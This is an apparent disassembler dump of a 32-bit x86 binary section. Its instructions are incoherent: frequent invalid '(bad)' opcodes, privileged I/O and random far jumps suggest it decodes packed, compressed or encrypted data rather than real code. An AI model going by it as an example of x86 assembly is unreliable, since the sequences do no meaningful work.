  41dc44:	xor    eax,0x1ecbd8ce
  41dc49:	add    DWORD PTR [eax+0x1cb3c257],ebp
  41dc4f:	(bad)  
  41dc50:	cmc    
  41dc51:	xchg   ecx,eax
  41dc52:	pusha  
  41dc53:	add    al,BYTE PTR [ebx+0x41]
  41dc56:	daa    
  41dc57:	push   edx
  41dc58:	add    esp,DWORD PTR [esi-0x1e9c17f9]
  41dc5e:	jecxz  0x41dc83
  41dc60:	lds    edx,FWORD PTR [eax]
  41dc62:	pop    esi
  41dc63:	mov    ds:0xc15d8b3d,al
  41dc68:	xchg   DWORD PTR [ebx-0x248a83c2],ebp
  41dc6e:	mov    eax,ds:0xef3a208d
  41dc73:	jg     0x41dc1f
  41dc75:	repnz push 0xc
  41dc78:	dec    esp
  41dc79:	and    ecx,esi
  41dc7b:	cmp    eax,0xdc2974ae
  41dc80:	aad    0x4
  41dc82:	cs xor esi,ecx
  41dc85:	cwde   
  41dc86:	icebp  
  41dc87:	pop    ebx
  41dc88:	mov    edx,0xf0bdef37
  41dc8d:	pop    edi
  41dc8e:	imul   DWORD PTR [ecx-0x6a]
  41dc91:	dec    eax
  41dc92:	popf   
  41dc93:	add    eax,0x5151bee1
  41dc98:	aaa    
  41dc99:	xor    ah,cl
  41dc9b:	fdiv   DWORD PTR [edi-0xe823b0a]
  41dca1:	fnstsw WORD PTR [esp+eax*4]
  41dca4:	adc    eax,0xdceb53e0
  41dca9:	or     esi,eax
  41dcab:	fldenv [edi]
  41dcad:	and    eax,0x39e4957d
  41dcb2:	popa   
  41dcb3:	aas    
  41dcb4:	stos   BYTE PTR es:[edi],al
  41dcb5:	dec    ebx
  41dcb6:	or     al,0x99
  41dcb8:	stos   DWORD PTR es:[di],eax
  41dcba:	jne    0x41dca8
  41dcbc:	leave  
  41dcbd:	jle    0x41dd04
  41dcbf:	imul   esi,DWORD PTR [edi-0x78],0x9d6ab0af
  41dcc6:	push   ecx
  41dcc7:	dec    ebp
  41dcc8:	leave  
  41dcc9:	scas   al,BYTE PTR es:[edi]
  41dcca:	pop    ebx
  41dccb:	pop    ss
  41dccc:	fisttp DWORD PTR [esi]
  41dccf:	aas    
  41dcd0:	inc    ebx
  41dcd1:	push   cs
  41dcd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dcd3:	or     BYTE PTR [esi+0x5e],cl
  41dcd6:	sbb    BYTE PTR [esi+esi*2-0x16],cl
  41dcda:	sbb    ebp,DWORD PTR [ecx+0x65]
  41dcdd:	clc    
  41dcde:	mov    ecx,0x48e7a9f4
  41dce3:	add    esi,DWORD PTR [edi+0x45]
  41dce6:	pop    ecx
  41dce7:	jmp    0x41dc92
  41dce9:	cmc    
  41dcea:	stos   BYTE PTR es:[edi],al
  41dceb:	add    cl,BYTE PTR [edx+0x46]
  41dcee:	adc    eax,0xfbd4fd28
  41dcf3:	dec    ebp
  41dcf4:	xchg   edi,eax
  41dcf5:	setg   BYTE PTR [ebx]
  41dcf8:	jne    0x41dcc9
  41dcfa:	in     al,0xd
  41dcfc:	and    eax,0xc2f128db
  41dd01:	push   es
  41dd02:	jmp    0x12c3db18
  41dd07:	push   ebp
  41dd08:	or     DWORD PTR [ebx],0x82309e39
  41dd0e:	test   DWORD PTR [eax-0x7bcbe339],ecx
  41dd14:	test   al,0x6f
  41dd16:	aam    0x9a
  41dd18:	adc    al,0x8c
  41dd1a:	jnp    0x41dd46
  41dd1c:	lods   eax,DWORD PTR ds:[esi]
  41dd1d:	sbb    eax,0x91991160
  41dd22:	xor    edi,eax
  41dd24:	mov    gs,WORD PTR [edx-0x168686d]
  41dd2a:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd2c:	pop    ebp
  41dd2d:	cmp    ah,BYTE PTR [esi+0x10]
  41dd30:	mov    ebx,0xf8775eba
	...
  41dd95:	add    BYTE PTR [eax],ah
  41dd97:	repz das 
  41dd99:	cmp    bh,0xde
  41dd9c:	lods   eax,DWORD PTR ds:[esi]
  41dd9d:	repz mov ds:0x8c1667bb,eax
  41dda3:	push   edx
  41dda4:	ins    DWORD PTR es:[edi],dx
  41dda5:	pop    edx
  41dda6:	sar    DWORD PTR [ebx],cl
  41dda8:	add    DWORD PTR [eax],eax
  41ddaa:	pop    es
  41ddab:	add    DWORD PTR [eax],eax
  41ddad:	add    BYTE PTR [edx-0x68],ch
  41ddb0:	cmp    BYTE PTR [eax],0x17
  41ddb3:	iret   
  41ddb4:	mov    ds:0x811cf1bc,al
  41ddb9:	push   ecx
  41ddba:	sbb    dh,BYTE PTR [ebx-0x47]
  41ddbd:	arpl   WORD PTR [ebx],ax
  41ddbf:	mov    eax,0xb46debc3
  41ddc4:	std    
  41ddc5:	jecxz  0x41de0e
  41ddc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ddc8:	mov    ebp,0xcf48c0c9
  41ddcd:	dec    edx
  41ddce:	das    
  41ddcf:	mov    ds:0x31628b69,al
  41ddd4:	mov    BYTE PTR [esi+0x45],0xbf
  41ddd8:	inc    ebp
  41ddd9:	data16 aaa 
  41dddb:	add    BYTE PTR [eax-0x65],ah
  41ddde:	test   BYTE PTR [ebx+0x223a04c3],dl
  41dde4:	retf   
  41dde5:	cld    
  41dde6:	dec    esp
  41dde7:	and    ebp,ebp
  41dde9:	icebp  
  41ddea:	loop   0x41dd74
  41ddec:	jmp    0xc2f08753
  41ddf1:	jb     0x41dd78
  41ddf3:	add    BYTE PTR [eax-0x575b5203],al
  41ddf9:	les    ebp,FWORD PTR [eax-0x56]
  41ddfc:	paddd  mm7,QWORD PTR [ebp-0x7d99604f]
  41de03:	jnp    0x41de40
  41de05:	jno    0x41ddad
  41de07:	popf   
  41de08:	xchg   ebp,eax
  41de09:	ins    DWORD PTR es:[edi],dx
  41de0a:	fs out 0x64,al
  41de0d:	ins    BYTE PTR es:[edi],dx
  41de0e:	inc    esi
  41de0f:	aam    0xbc
  41de11:	fidivr WORD PTR [ecx]
  41de13:	ret    
  41de14:	stos   BYTE PTR es:[edi],al
  41de15:	imul   di,WORD PTR [esi],0x1e
  41de19:	mov    dl,0xc1
  41de1b:	sbb    edi,DWORD PTR [ebp-0x33]
  41de1e:	pop    edx
  41de1f:	cmp    esi,DWORD PTR [ecx+ebx*1+0x11]
  41de23:	adc    bl,BYTE PTR [ecx]
  41de25:	mov    ds:0x69097d6e,al
  41de2a:	lahf   
  41de2b:	add    bl,bl
  41de2d:	imul   edi
  41de2f:	push   ecx
  41de30:	dec    eax
  41de31:	pop    edx
  41de32:	or     al,0x89
  41de34:	mov    dh,0x1
  41de36:	fsincos 
  41de38:	inc    ebx
  41de39:	scas   eax,DWORD PTR es:[edi]
  41de3a:	mov    edx,0xb996bf9a
  41de3f:	inc    ebx
  41de40:	bound  edi,QWORD PTR [eax]
  41de42:	jbe    0x41deb7
  41de44:	xchg   edx,eax
  41de45:	lods   al,BYTE PTR ds:[esi]
  41de46:	out    dx,al
  41de47:	mov    dh,0xcc
  41de49:	pop    ds
  41de4a:	out    dx,eax
  41de4b:	cmp    ch,BYTE PTR [eax-0x648a2d3f]
  41de51:	ret    0x90b9
  41de54:	add    eax,0x8560c23
  41de59:	pop    ecx
  41de5a:	add    esp,DWORD PTR [ebp-0x3c9a0b3e]
  41de60:	pop    edi
  41de61:	mov    ebp,0xd3e85ec1
  41de66:	(bad)  
  41de67:	sub    BYTE PTR [ecx+0x3a],bl
  41de6a:	fucomi st,st(0)
  41de6c:	fnsave [eax-0x6daf5d40]
  41de72:	sti    
  41de73:	push   ebp
  41de74:	push   es
  41de75:	popw   es
  41de77:	icebp  
  41de78:	push   ebp
  41de79:	dec    edx
  41de7a:	sahf   
  41de7b:	les    edx,FWORD PTR [ebx+0x59]
  41de7e:	dec    esp
  41de7f:	stos   DWORD PTR es:[edi],eax
  41de80:	push   edx
  41de81:	dec    eax
  41de82:	or     bh,BYTE PTR [eax-0x55]
  41de85:	add    BYTE PTR [esi-0x43c24d97],ah
  41de8b:	push   ecx
  41de8c:	xchg   edx,eax
  41de8d:	loopne 0x41de5c
  41de8f:	je     0x41dec9
  41de91:	sbb    al,0xe9
  41de93:	jge    0x41dedf
  41de95:	jno    0x41deb6
  41de97:	push   ecx
  41de98:	mov    ds:0x58b22a8f,al
  41de9d:	xchg   ebp,eax
  41de9e:	pop    edx
  41de9f:	imul   ebp,DWORD PTR [esi-0x6750a088],0x2dddcc18
  41dea9:	and    BYTE PTR [ecx],dl
  41deab:	push   eax
  41deac:	pusha  
  41dead:	aas    
  41deae:	mov    BYTE PTR [eax+0x30],al
  41deb1:	mov    dl,0x86
  41deb3:	jl     0x41ded4
	...
  41df15:	add    BYTE PTR [edi],bh
  41df17:	daa    
  41df18:	push   ss
  41df19:	cld    
  41df1a:	push   ds
  41df1b:	std    
  41df1c:	jmp    edi
  41df1e:	pop    es
  41df1f:	adc    eax,0x66dcc191
  41df24:	and    al,0xda
  41df26:	fidivr DWORD PTR [ecx+eax*1]
  41df29:	add    BYTE PTR [edi],al
  41df2b:	add    DWORD PTR [eax],eax
  41df2d:	add    BYTE PTR [ebp-0x44],dh
  41df30:	jge    0x41df40
  41df32:	js     0x41df66
  41df34:	inc    eax
  41df35:	mov    bh,0x65
  41df37:	dec    ebp
  41df38:	cs aaa 
  41df3a:	out    0xc2,al
  41df3c:	fdivr  QWORD PTR [eiz*2-0x3a6d6123]
  41df43:	(bad)  
  41df45:	pusha  
  41df46:	(bad)  
  41df47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df48:	in     eax,0x83
  41df4a:	(bad)  
  41df4b:	pop    esi
  41df4c:	jmp    0x8de7:0x8580b9a1
  41df53:	or     ch,BYTE PTR [eax+eiz*1+0x2c]
  41df57:	mov    ds,ebx
  41df59:	sbb    edx,DWORD PTR [edx]
  41df5b:	outs   dx,BYTE PTR ds:[esi]
  41df5c:	test   DWORD PTR [edi+0x51],edx
  41df5f:	jns    0x41df24
  41df61:	test   eax,0xbc5a93fe
  41df66:	imul   ebx,DWORD PTR [eax-0x22cb3605],0x3c949fc0
  41df70:	neg    DWORD PTR gs:[edi]
  41df73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df74:	xchg   esi,eax
  41df75:	dec    eax
  41df76:	dec    ecx
  41df77:	test   bh,ah
  41df79:	outs   dx,DWORD PTR ds:[esi]
  41df7a:	and    ah,bl
  41df7c:	mov    cl,0x2d
  41df7e:	out    0xc4,eax
  41df80:	es inc eax
  41df82:	cmp    eax,0x9dc7cc8f
  41df87:	daa    
  41df88:	(bad)  
  41df89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df8a:	int    0xc3
  41df8c:	add    esi,DWORD PTR [edx-0x32e74f38]
  41df92:	popf   
  41df93:	dec    ebp
  41df94:	mov    ds:0x59ddb69e,eax
  41df99:	cmp    cl,cl
  41df9b:	cmp    BYTE PTR [esi-0x19],0xe0
  41df9f:	mov    eax,0xbfa92b0
  41dfa4:	dec    esi
  41dfa5:	dec    eax
  41dfa6:	clc    
  41dfa7:	jns    0x41df76
  41dfa9:	pop    ss
  41dfaa:	mov    ch,0x38
  41dfac:	add    esi,DWORD PTR [edi+0x42a41df2]
  41dfb2:	mov    gs,WORD PTR [edi-0x460288df]
  41dfb8:	jb     0x41df75
  41dfba:	inc    eax
  41dfbb:	loopne 0x41df67
  41dfbd:	jmp    FWORD PTR [eax+ebx*2-0x7c]
  41dfc1:	repz lea ecx,[esi+0xa1f27ae]
  41dfc8:	and    eax,esp
  41dfca:	xchg   ebp,eax
  41dfcb:	in     al,0x9
  41dfcd:	fwait
  41dfce:	jmp    0x41dfa4
  41dfd0:	jo     0x41dfd4
  41dfd2:	(bad)  
  41dfd3:	cdq    
  41dfd4:	mov    bh,0xe7
  41dfd6:	mov    DWORD PTR [eax],esi
  41dfd8:	shl    bh,cl
  41dfda:	test   eax,edi
  41dfdc:	call   0x8a00:0xd47e38f3
  41dfe3:	adc    ah,BYTE PTR [edx]
  41dfe5:	sub    esi,DWORD PTR [edx]
  41dfe7:	je     0x41dfb7
  41dfe9:	xor    eax,0xf7cadaeb
  41dfee:	inc    edi
  41dfef:	hlt    
  41dff0:	test   al,0xbf
  41dff2:	xchg   edi,eax
  41dff3:	add    DWORD PTR [edi-0x64de9384],eax
  41dff9:	ret    
  41dffa:	pop    edx
  41dffb:	test   BYTE PTR [ebp-0x74],0xd2
  41dfff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e000:	sub    bl,ch
  41e002:	sub    BYTE PTR [ecx-0x7d],ah
  41e005:	mov    esp,0x7219552a
  41e00a:	dec    edx
  41e00b:	push   edx
  41e00c:	outs   dx,BYTE PTR ds:[esi]
  41e00d:	xor    ch,dl
  41e00f:	jbe    0x41dfe9
  41e011:	xchg   edx,eax
  41e012:	xor    eax,0xc51f71f0
  41e017:	xor    BYTE PTR [ecx+0x62d178c1],bl
  41e01d:	and    DWORD PTR [eax+0x6c],esp
  41e020:	cdq    
  41e021:	jno    0x41dfe0
  41e023:	sahf   
  41e024:	and    esp,ebx
  41e026:	cwde   
  41e027:	dec    ebx
  41e028:	xchg   esp,eax
  41e029:	pushf  
  41e02a:	inc    ebp
  41e02b:	pop    ss
  41e02c:	push   edx
  41e02d:	jl     0x41dffb
  41e02f:	std    
  41e030:	inc    ebx
  41e031:	rol    DWORD PTR [edx],1
  41e033:	adc    al,BYTE PTR [edx]
	...
  41e095:	add    BYTE PTR [edi+0x53],cl
  41e098:	add    al,0xc
  41e09a:	sbb    al,0x5f
  41e09c:	dec    edi
  41e09d:	push   ebx
  41e09e:	out    0x48,eax
  41e0a0:	jge    0x41e0ce
  41e0a2:	es jl  0x41e05c
  41e0a5:	jns    0x41e088
  41e0a7:	cmp    eax,0x1070001
  41e0ac:	add    BYTE PTR [eax],al
  41e0ae:	xchg   edi,eax
  41e0af:	mov    esp,?
  41e0b1:	jno    0x41e061
  41e0b3:	fidiv  WORD PTR [edi-0x77]
  41e0b6:	lods   eax,DWORD PTR ds:[esi]
  41e0b7:	and    ebp,ebp
  41e0b9:	in     al,dx
  41e0ba:	neg    BYTE PTR [eax+0x5f]
  41e0bd:	pop    edi
  41e0be:	dec    ecx
  41e0bf:	loop   0x41e0c1
  41e0c1:	cmp    DWORD PTR [edx-0x1fc5fe85],ebx
  41e0c7:	cmc    
  41e0c8:	stos   BYTE PTR es:[edi],al
  41e0c9:	xchg   ebp,eax
  41e0ca:	mov    al,0x33
  41e0cc:	mov    al,BYTE PTR [edx-0xa256e73]
  41e0d2:	stos   DWORD PTR es:[edi],eax
  41e0d3:	jle    0x41e06a
  41e0d5:	xor    eax,0x231076a
  41e0da:	stos   BYTE PTR es:[edi],al
  41e0db:	jmp    0x1414:0xdecc0589
  41e0e2:	jno    0x41e0d8
  41e0e4:	pop    eax
  41e0e5:	stc    
  41e0e6:	inc    ecx
  41e0e7:	jns    0x41e113
  41e0e9:	in     al,0x45
  41e0eb:	jp     0x41e104
  41e0ed:	mov    ecx,0x80569473
  41e0f2:	das    
  41e0f3:	xor    DWORD PTR [edi-0x19b29171],ebx
  41e0f9:	and    esi,DWORD PTR [ebp-0x58]
  41e0fc:	jge    0x41e118
  41e0fe:	mov    DWORD PTR [esi],edi
  41e100:	push   ds
  41e101:	jo     0x41e09c
  41e103:	push   eax
  41e104:	iret   
  41e105:	dec    esp
  41e106:	add    eax,0x394a3512
  41e10b:	in     al,dx
  41e10c:	dec    esi
  41e10d:	push   esi
  41e10e:	jecxz  0x41e13a
  41e110:	or     BYTE PTR [edx-0xe],ch
  41e113:	and    al,al
  41e115:	cmp    eax,0x96e6e449
  41e11a:	push   esp
  41e11b:	iret   
  41e11c:	jp     0x41e0cc
  41e11e:	cmp    eax,0xfdcf6d34
  41e123:	shl    BYTE PTR [ebp+0xf],cl
  41e126:	dec    edx
  41e127:	pushf  
  41e128:	loope  0x41e10e
  41e12a:	pop    esp
  41e12b:	dec    esp
  41e12c:	test   eax,0x9a15770c
  41e131:	mov    ebx,0xe43d3dc8
  41e136:	mov    DWORD PTR [edi-0x35b6c0e9],eax
  41e13c:	rol    DWORD PTR [ecx],1
  41e13e:	sub    edx,DWORD PTR [ebx+0x1]
  41e141:	retf   0x2c68
  41e144:	in     al,0xab
  41e146:	inc    ebx
  41e147:	lahf   
  41e148:	xor    BYTE PTR [ebx+0x45],0x4d
  41e14c:	inc    eax
  41e14d:	xor    dl,BYTE PTR [ebx+0x33]
  41e150:	or     edi,ecx
  41e152:	add    al,0xfa
  41e154:	xchg   ebx,eax
  41e155:	cmp    ebp,DWORD PTR [ecx]
  41e157:	mov    BYTE PTR [ebp-0x50],cl
  41e15a:	xor    DWORD PTR [ecx+edx*8-0x6e82821],ecx
  41e161:	xchg   BYTE PTR ds:0xea81eb7b,al
  41e167:	sbb    BYTE PTR [esi-0x3ed87f8],ah
  41e16d:	pop    ss
  41e16e:	daa    
  41e16f:	add    al,0x68
  41e171:	and    eax,0xa11e6430
  41e176:	inc    ebx
  41e177:	pop    eax
  41e178:	adc    DWORD PTR [esi+0x36d7d61e],esi
  41e17e:	add    bl,ah
  41e180:	sub    eax,0x419bdc13
  41e185:	(bad)  
  41e186:	in     al,dx
  41e187:	lahf   
  41e188:	addr16 rol ah,0x9d
  41e18c:	inc    edx
  41e18d:	(bad)  
  41e18e:	xchg   esp,eax
  41e18f:	mov    edx,0x23bc1131
  41e194:	idiv   esp
  41e196:	pop    es
  41e197:	push   ss
  41e198:	cld    
  41e199:	int    0x77
  41e19b:	xor    al,0x11
  41e19d:	push   ecx
  41e19e:	mov    ds:0xbb9510a6,eax
  41e1a3:	push   0xde453b2a
  41e1a8:	cmp    eax,0x462f662
  41e1ad:	adc    DWORD PTR [esi-0x2a],0x49
  41e1b1:	adc    cl,cl
  41e1b3:	sbb    al,BYTE PTR [ebp+0x0]
	...
  41e216:	stos   DWORD PTR es:[edi],eax
  41e217:	add    dh,BYTE PTR [edi-0x1a]
  41e21a:	push   edi
  41e21c:	mov    ebx,0xf08a4a4f
  41e221:	mov    esi,DWORD PTR [eax]
  41e223:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e224:	hlt    
  41e225:	lods   al,BYTE PTR ds:[esi]
  41e226:	call   0x741e369
  41e22b:	add    DWORD PTR [eax],eax
  41e22d:	add    BYTE PTR [esi-0x2c1cbaf0],al
  41e233:	sbb    al,0xc9
  41e235:	pop    eax
  41e236:	dec    ebp
  41e237:	dec    esp
  41e239:	les    esi,FWORD PTR [esp+esi*8-0x39aba206]
  41e240:	sub    eax,ecx
  41e242:	adc    DWORD PTR [eax-0x33],eax
  41e245:	adc    edx,DWORD PTR [edx+0x5e78c1c5]
  41e24b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e24c:	shl    DWORD PTR [edi+eiz*4-0x56],0xfc
  41e251:	out    dx,eax
  41e252:	(bad)  
  41e253:	push   esi
  41e254:	mov    eax,0x4741bc79
  41e259:	mov    ah,0x0
  41e25b:	dec    edx
  41e25c:	call   0x21ec:0x545b7999
  41e263:	(bad)  
  41e264:	and    DWORD PTR [eax+0x256d28c8],ebx
  41e26a:	jae    0x41e236
  41e26c:	and    BYTE PTR [ebx-0x71e18897],ah
  41e272:	cmp    esp,edi
  41e274:	mul    DWORD PTR [eax-0x5ed8473]
  41e27a:	mov    edi,ebp
  41e27c:	scas   al,BYTE PTR es:[edi]
  41e27d:	int    0x2
  41e27f:	add    al,0xec
  41e281:	shl    BYTE PTR [esi],0x7b
  41e284:	loop   0x41e223
  41e286:	cmc    
  41e287:	pop    ebp
  41e288:	fiadd  WORD PTR [ebx-0x74]
  41e28b:	stos   DWORD PTR es:[edi],eax
  41e28c:	sti    
  41e28d:	mov    dh,0xc7
  41e28f:	fmul   DWORD PTR [eax+edi*1]
  41e292:	mov    dl,0x97
  41e294:	xor    al,0x68
  41e296:	dec    esi
  41e297:	stc    
  41e298:	hlt    
  41e299:	bound  esp,QWORD PTR ss:[edi+0x75]
  41e29d:	popf   
  41e29e:	mov    al,ds:0xb2fa49fe
  41e2a3:	mov    ds:0xf17cddd4,al
  41e2a8:	xor    ch,dh
  41e2aa:	and    bh,BYTE PTR [edi-0x1266f329]
  41e2b0:	les    esp,FWORD PTR [esp+eax*2+0x77]
  41e2b4:	xor    al,0x4e
  41e2b6:	call   0x5fae6212
  41e2bb:	xchg   DWORD PTR [eax],eax
  41e2bd:	mov    ecx,0x7ad51841
  41e2c2:	adc    DWORD PTR [ecx+0x2c],ecx
  41e2c5:	cmp    al,0x9
  41e2c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e2c8:	push   esi
  41e2c9:	sahf   
  41e2ca:	mov    edx,0xdd801daa
  41e2cf:	das    
  41e2d0:	(bad)  
  41e2d2:	ret    0x983d
  41e2d5:	cmp    dh,ah
  41e2d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e2d8:	sub    al,dl
  41e2da:	lds    esi,FWORD PTR [ebx-0x2e]
  41e2dd:	xor    eax,0x684f6a0f
  41e2e2:	push   es
  41e2e3:	push   DWORD PTR [ecx+ecx*1+0x1e]
  41e2e7:	jmp    0x9262:0x8431b5d8
  41e2ee:	ret    0xe43d
  41e2f1:	popa   
  41e2f2:	out    0x4b,al
  41e2f4:	fsub   QWORD PTR [esi+0x23aef2dd]
  41e2fa:	cmp    eax,0x3fa27f0e
  41e2ff:	popf   
  41e300:	dec    edi
  41e301:	outs   dx,BYTE PTR ds:[esi]
  41e302:	test   ah,dh
  41e304:	sbb    al,0xfd
  41e306:	adc    al,0x30
  41e308:	jb     0x41e359
  41e30a:	loop   0x41e2b4
  41e30c:	add    al,bl
  41e30e:	mov    DWORD PTR [esi+0x6d],ebx
  41e311:	call   0xcb316367
  41e316:	adc    DWORD PTR [eax-0x5c],0x25532201
  41e31d:	mov    edx,0xf86e8cf5
  41e322:	sbb    ah,dh
  41e324:	sar    DWORD PTR [eax-0x7d33fa5d],0xf9
  41e32b:	icebp  
  41e32c:	shr    al,0x59
  41e32f:	loope  0x41e2e9
  41e331:	and    eax,0x815931
	...
  41e396:	mov    DWORD PTR [edx],edx
  41e398:	ja     0x41e3b9
  41e39a:	(bad)  
  41e39b:	jg     0x41e386
  41e39d:	xchg   esi,eax
  41e39e:	cmp    eax,0xdf204855
  41e3a3:	push   0xffffffa5
  41e3a5:	dec    esi
  41e3a6:	out    dx,eax
  41e3a7:	aas    
  41e3a8:	add    DWORD PTR [eax],eax
  41e3aa:	pop    es
  41e3ab:	add    DWORD PTR [eax],eax
  41e3ad:	add    dl,ah
  41e3af:	sbb    DWORD PTR [eax-0x2e4489bc],eax
  41e3b5:	rcr    dl,0x47
  41e3b8:	arpl   WORD PTR [ebp-0x5be0a450],di
  41e3be:	xchg   DWORD PTR [edi+eax*2-0x39],ecx
  41e3c2:	in     eax,dx
  41e3c3:	push   ebx
  41e3c4:	test   DWORD PTR [edi+0x43250536],ecx
  41e3ca:	adc    eax,0x4edd2e29
  41e3cf:	aam    0x2c
  41e3d1:	adc    eax,0x9a88eff
  41e3d6:	scas   al,BYTE PTR es:[edi]
  41e3d7:	xchg   DWORD PTR [esp+ebp*2-0x50b9d035],ebp
  41e3de:	or     al,0x8f
  41e3e0:	jo     0x41e3cb
  41e3e2:	test   DWORD PTR ds:0xfc6bbe0f,ecx
  41e3e8:	jmp    0x6b42:0x6e9084ea
  41e3ef:	(bad)  
  41e3f0:	es mov dl,0xf5
  41e3f3:	jnp    0x41e429
  41e3f5:	xor    cl,dh
  41e3f7:	pop    ebp
  41e3f8:	je     0x41e399
  41e3fa:	pop    ecx
  41e3fb:	xchg   edi,eax
  41e3fc:	retf   
  41e3fd:	and    BYTE PTR [eax-0x52519c5c],ah
  41e403:	lea    eax,[edi-0x23]
  41e406:	(bad)  
  41e407:	arpl   WORD PTR [edi],bp
  41e409:	lock (bad) 
  41e40b:	adc    BYTE PTR ss:[eax+ebp*2+0x20d33232],bh
  41e413:	jne    0x41e452
  41e415:	iret   
  41e416:	mov    al,ss:0x10fa4a7c
  41e41c:	clc    
  41e41d:	ficomp WORD PTR [edx-0x212f8391]
  41e423:	mov    edx,DWORD PTR [edi+0x1739dae7]
  41e429:	pop    edx
  41e42a:	mov    bh,0x28
  41e42c:	sub    esp,esp
  41e42e:	shr    DWORD PTR [ecx+0x19],1
  41e431:	mov    ecx,0x1ef32ffd
  41e436:	sbb    DWORD PTR fs:0x21700e03,ebp
  41e43d:	stos   DWORD PTR es:[edi],eax
  41e43e:	stos   DWORD PTR es:[edi],eax
  41e43f:	jp     0x41e464
  41e441:	lock out 0x1f,al
  41e444:	and    eax,0xd9e91729
  41e449:	jmp    0xdccb:0x628c6764
  41e450:	push   ebx
  41e451:	cmp    dh,0xef
  41e454:	mov    al,0x18
  41e456:	jmp    0xd4233ee1
  41e45b:	dec    DWORD PTR ds:0x24e6ca68
  41e461:	xchg   edx,eax
  41e462:	add    al,0x80
  41e464:	jg     0x41e49c
  41e466:	sbb    DWORD PTR [eax+0x26d000b6],ecx
  41e46c:	sbb    ah,BYTE PTR [esi]
  41e46e:	cmp    BYTE PTR [esi+0x2713ae76],dl
  41e474:	inc    ebp
  41e475:	loope  0x41e41f
  41e477:	sbb    BYTE PTR [esp+edi*4+0x425cb63e],bl
  41e47e:	mov    cl,0xed
  41e480:	sbb    al,BYTE PTR [ebp+edx*4+0x6c]
  41e484:	dec    ebp
  41e485:	mov    esi,0x144e7f38
  41e48a:	sbb    ch,BYTE PTR [edi-0x44898a2b]
  41e490:	rol    BYTE PTR [ebx],0xfd
  41e493:	test   al,0x87
  41e495:	jno    0x41e4ef
  41e497:	stc    
  41e498:	pop    ebp
  41e499:	in     al,dx
  41e49a:	inc    esp
  41e49b:	push   eax
  41e49c:	les    edi,FWORD PTR [edi+edi*8-0x8723e5d]
  41e4a3:	and    al,0xb5
  41e4a5:	or     al,0x98
  41e4a7:	pop    ss
  41e4a8:	rol    BYTE PTR [edi-0x18fe4cd7],0xe4
  41e4af:	pop    ebp
  41e4b0:	jl     0x41e469
  41e4b2:	dec    esi
  41e4b3:	jp     0x41e4d4
	...
  41e515:	add    BYTE PTR [eax],ah
  41e517:	push   0xffffffcb
  41e519:	dec    ebx
  41e51a:	retf   
  41e51b:	jmp    0x41e4bd
  41e51d:	imul   ecx,DWORD PTR [edi+0x51],0xffffff9a
  41e521:	push   ss
  41e522:	sbb    bl,BYTE PTR [eax-0x68]
  41e525:	jne    0x41e51d
  41e527:	inc    eax
  41e528:	add    DWORD PTR [eax],eax
  41e52a:	pop    es
  41e52b:	add    DWORD PTR [eax],eax
  41e52d:	add    BYTE PTR [eax+0x50],bl
  41e530:	push   edi
  41e531:	add    eax,0x3bdf025c
  41e536:	fwait
  41e537:	jmp    0x41e576
  41e539:	cmp    al,0x3c
  41e53b:	push   eax
  41e53c:	dec    esp
  41e53d:	fmul   DWORD PTR [edi]
  41e53f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e540:	jg     0x41e58a
  41e542:	fs std 
  41e544:	call   0xa8b8dd31
  41e549:	retf   
  41e54a:	adc    eax,0xb0630f
  41e54f:	sub    eax,0x53c5ec2a
  41e554:	rcl    BYTE PTR [esi-0x72ce540e],1
  41e55a:	pop    ds
  41e55b:	pop    ss
  41e55c:	in     eax,dx
  41e55d:	mov    ecx,0x3307ccfd
  41e562:	adc    al,0x2
  41e564:	imul   BYTE PTR [eax-0xb]
  41e567:	inc    ebx
  41e568:	(bad)  
  41e569:	retf   0xd600
  41e56c:	mov    bh,0x3f
  41e56e:	scas   al,BYTE PTR es:[edi]
  41e56f:	(bad)  
  41e570:	daa    
  41e571:	sbb    al,0x9c
  41e573:	mov    dl,0xc1
  41e575:	lea    esp,[edx+0x4df4e753]
  41e57b:	sub    esp,DWORD PTR [esi-0x56]
  41e57e:	cmp    eax,0xa01443a9
  41e583:	push   edi
  41e584:	ret    0xbe15
  41e587:	pop    eax
  41e588:	dec    ebx
  41e589:	loopne 0x41e5cb
  41e58b:	call   0x395b:0xb2341904
  41e592:	dec    edi
  41e593:	jge    0x41e5a0
  41e595:	ss jg  0x41e59e
  41e598:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e599:	popa   
  41e59a:	loope  0x41e53d
  41e59c:	push   eax
  41e59d:	into   
  41e59e:	popa   
  41e59f:	ror    BYTE PTR [eax-0x23cc1741],0xa1
  41e5a6:	enter  0x4f6d,0xae
  41e5aa:	xchg   BYTE PTR ds:0xa9fc6ebd,dh
  41e5b0:	or     dl,BYTE PTR [esi-0x6872c65a]
  41e5b6:	daa    
  41e5b7:	mov    ch,BYTE PTR [eax+eax*2]
  41e5ba:	push   ecx
  41e5bb:	add    BYTE PTR [ebp-0x523a5868],ch
  41e5c1:	imul   ecx,DWORD PTR [edi+ebx*2+0x11],0xffffffaa
  41e5c6:	jo     0x41e5fe
  41e5c8:	xor    BYTE PTR [ebx],bh
  41e5ca:	cmp    edx,ebx
  41e5cc:	addr16 jb 0x41e560
  41e5cf:	xor    ch,BYTE PTR [edx+eiz*8+0x1c243b66]
  41e5d6:	push   0x79d8ef18
  41e5db:	test   al,0xb4
  41e5dd:	mov    edx,DWORD PTR [edx+0x6bbc65ea]
  41e5e3:	sub    eax,0x791536a2
  41e5e8:	add    DWORD PTR [esi+0x2d1c415b],ebx
  41e5ee:	xchg   esi,eax
  41e5ef:	xor    BYTE PTR [ebp-0x16],cl
  41e5f2:	xor    eax,0xab904988
  41e5f7:	xchg   esp,eax
  41e5f8:	sub    DWORD PTR [eax+0x54ac11b6],ebp
  41e5fe:	hlt    
  41e5ff:	adc    bl,0x47
  41e602:	icebp  
